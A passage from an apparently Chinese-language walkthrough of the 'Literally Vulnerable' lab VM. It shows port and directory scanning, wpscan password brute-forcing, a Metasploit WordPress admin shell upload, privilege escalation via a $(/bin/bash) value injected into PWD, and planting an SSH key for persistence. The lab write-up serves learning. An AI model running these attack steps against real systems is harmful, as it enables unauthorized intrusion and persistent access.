*<span class="token variable">$eGRIf7v38s</span><span class="token operator">&amp;</span>p7
yP<span class="token variable">$*</span>SV09YOrx7mY
GmceC<span class="token operator">&amp;</span>oOBtbnFCH
<span class="token number">3</span><span class="token operator">!</span>IZguT2piU8X<span class="token variable">$c</span>
P<span class="token operator">&amp;</span>s%F1D4<span class="token comment">#KDBSeS</span>
<span class="token variable">$EPid</span>%J2L9LufO5
nD<span class="token operator">!</span>mb*aHON<span class="token operator">&amp;</span><span class="token number">76</span><span class="token operator">&amp;</span>G
<span class="token variable">$*</span>Ke7q2ko3tqoZo
SCb<span class="token variable">$I</span>^gDDqE34fA
Ae%tM0XIWUMsCLp
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>相当于拿到了一个字典</p> <p>之前wpscan的时候拿到了user列表</p> <p>试试用这个字典能不能破解</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>wpscan <span class="token parameter variable">--url</span> http://192.168.31.166 <span class="token parameter variable">-U</span> users.txt <span class="token parameter variable">-P</span> backupPasswords
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>很遗憾没有成功.....</p> <p>接下来怎么办.....</p> <p>看了一下大佬写的WalkThrough发现</p> <p>前面居然漏扫了一个端口</p> <p>加个-p-参数才能扫出来...</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>nmap -p- <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.31.166
<span class="token punctuation">..</span>.
<span class="token number">65535</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Apache2 Ubuntu Default Page: It works
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>估计是因为端口号太大了</p> <p>访问是个Apache2的默认界面</p> <p>fuzz一下看看能不能读其他目录</p> <p>这里就要用Gobuster了</p> <blockquote><p>Gobuster是Kali Linux默认安装的一款暴力扫描工具。它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。该工具支持对子域名和Web目录进行基于字典的暴力扫描。不同于其他工具，该工具支持同时多扩展名破解，适合采用多种后台技术的网站。实施子域名扫描时，该工具支持泛域名扫描，并允许用户强制继续扫描，以应对泛域名解析带来的影响。</p></blockquote> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.31.166:65535/ <span class="token parameter variable">-w</span> /usr/share/wordlists/dirb/big.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>返回</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.0.1
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@_FireFart_<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:            http://192.168.31.166:65535/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:        <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Status codes:   <span class="token number">200,204</span>,301,302,307,401,403
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:     gobuster/3.0.1
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:        10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2020</span>/01/16 <span class="token number">12</span>:25:53 Starting gobuster
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.htpasswd <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span>
/.htaccess <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span>
/javascript <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span>
/phpcms <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span>
/server-status <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">2020</span>/01/16 <span class="token number">12</span>:25:54 Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>试了一下phpcms是可以访问的</p> <p>而且有趣的是现在网站的标题变成了Literally Vulnerable</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/img/Screenshot_2020-01-16_12-28-50.png" alt=""></p> <p>再用wpscan扫一下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>wpscan <span class="token parameter variable">--url</span> http://192.168.31.166:65535/phpcms/ <span class="token parameter variable">--enumerate</span>
_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.31.166:65535/phpcms/
[+] Started: Thu Jan 16 12:31:23 2020

Interesting Finding(s):

[+] http://192.168.31.166:65535/phpcms/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.31.166:65535/phpcms/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.31.166:65535/phpcms/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.31.166:65535/phpcms/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.31.166:65535/phpcms/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.31.166:65535/phpcms/, Match: '</span>wp-includes<span class="token punctuation">\</span>/js<span class="token punctuation">\</span>/wp-emoji-release.min.js?ver<span class="token operator">=</span><span class="token number">5.3</span><span class="token string">'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.31.166:65535/phpcms/, Match: '</span>WordPress <span class="token number">5.3</span>'

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Vulnerable Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span>

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Vulnerable Themes <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Checking Known Locations - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">323</span> / <span class="token number">323</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No themes Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Timthumbs <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Checking Known Locations - Time: 00:00:01 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">2568</span> / <span class="token number">2568</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:01

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Timthumbs Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Checking Config Backups - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">21</span> / <span class="token number">21</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating DB Exports <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Checking DB Exports - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">36</span> / <span class="token number">36</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No DB Exports Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Medias <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span> <span class="token punctuation">(</span>Permalink setting must be <span class="token builtin class-name">set</span> to <span class="token string">&quot;Plain&quot;</span> <span class="token keyword">for</span> those to be detected<span class="token punctuation">)</span>
 Brute Forcing Attachment IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">100</span> / <span class="token number">100</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Medias Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Users <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Brute Forcing Author IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">10</span> / <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> maybeadmin
 <span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> notadmin
 <span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No WPVulnDB API Token given, as a result vulnerability data has not been output.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> You can get a <span class="token function">free</span> API token with <span class="token number">50</span> daily requests by registering at https://wpvulndb.com/users/sign_up.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Thu Jan <span class="token number">16</span> <span class="token number">12</span>:31:30 <span class="token number">2020</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">3103</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">14</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">981.093</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">984.625</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">215.057</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:07
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br></div></div><p>拿到两个用户名，再跑下字典试试</p> <p>找到一个对应的</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token punctuation">[</span>i<span class="token punctuation">]</span> Valid Combinations Found:
 <span class="token operator">|</span> Username: maybeadmin, Password: <span class="token variable">$EPid</span>%J2L9LufO5
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>登陆试试</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/img/Screenshot_2020-01-16_12-37-46.png" alt=""></p> <p>在密码保护页面里找到了notadmin的密码Pa$$w0rd13!&amp;</p> <p>登陆以后看起来我们拿到了wordpress的管理员用户</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/img/Screenshot_2020-01-16_12-41-48.png" alt=""></p> <p>然后就可以用msf拿到shell了</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>root@kali:~<span class="token comment"># msfdb start</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting database
root@kali:~<span class="token comment"># msfconsole -q</span>
msf5 <span class="token operator">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.31.166
rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.31.166
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rport <span class="token number">65535</span>
rport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">65535</span>
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> targeturi /phpcms
targeturi <span class="token operator">=</span><span class="token operator">&gt;</span> /phpcms
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> username notadmin
username <span class="token operator">=</span><span class="token operator">&gt;</span> notadmin
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> password Pa<span class="token variable">$$</span>w0rd13<span class="token operator">!</span><span class="token operator">&amp;</span>
password <span class="token operator">=</span><span class="token operator">&gt;</span> Pa<span class="token variable">$$</span>w0rd13<span class="token operator">!</span><span class="token operator">&amp;</span>
msf5 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
meterpreter <span class="token operator">&gt;</span> shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>然后用python脚本获得我们熟悉的交互式shell</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>shell玩了一下</p> <p>进/home 有两个文件夹 doe和john</p> <p>doe里有个iteasy 和不能读的local.txt以及似乎没什么敏感信息的noteFromAdmin</p> <p>itseasy作用是输出当前目录也就类似echo PWD</p> <p>john里有个user.txt也读不了</p> <p>怎么办....</p> <p>既然itseasy能echo</p> <p>拼接一个$(/bin/sh)试试</p> <p>好像不会正常回显。。。。</p> <p>试试/bin/bash</p> <p>这回可以了</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>www-data@literallyvulnerable:$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span><span class="token punctuation">\</span>$<span class="token punctuation">\</span><span class="token punctuation">(</span>/bin/bash<span class="token punctuation">\</span><span class="token punctuation">)</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span><span class="token punctuation">\</span>$<span class="token punctuation">\</span><span class="token punctuation">(</span>/bin/bash<span class="token punctuation">\</span><span class="token punctuation">)</span>
www-data@literallyvulnerable:<span class="token variable"><span class="token variable">$(</span>/bin/bash<span class="token variable">)</span></span>$ /home/doe/itseasy
/home/doe/itseasy
sh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such <span class="token function">file</span> or directory
sh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directory
john@literallyvulnerable:$ 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>我们变成john了</p> <p>但是好像也没有正常回显</p> <p>对了，我们不是还有ssh服务吗</p> <p>考虑生成一对RSA密钥</p> <p>然后连上ssh服务</p> <p>首先在本地生成</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>ssh-keygen
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>然后把生成的公钥丢到服务器上就可以了</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>john@literallyvulnerable:/home/john$ <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /home/john/.ssh
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /home/john/.ssh
john@literallyvulnerable:/home/john$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;&lt;你的公钥内容&gt;&quot;</span> <span class="token operator">&gt;</span> /home/john/.ssh/authorized_keys
<span class="token operator">&lt;</span>MfUMM<span class="token operator">=</span> root@kali&quot; <span class="token operator">&gt;</span> /home/john/.ssh/authorized_keys
